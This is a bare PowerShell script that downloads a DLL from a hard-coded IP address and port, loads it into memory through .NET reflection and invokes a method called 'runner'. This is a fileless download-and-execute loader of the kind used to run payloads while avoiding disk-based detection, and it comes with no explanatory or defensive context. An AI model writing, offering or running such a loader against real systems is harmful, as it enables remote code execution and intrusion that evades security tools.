
$data = (New-Object System.Net.WebClient).DownloadData('http://172.16.62.228:8080/myDLL.dll')
$assem = [System.Reflection.Assembly]::Load($data)
#$assem = [System.Reflection.Assembly]::LoadFile(". . .")
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)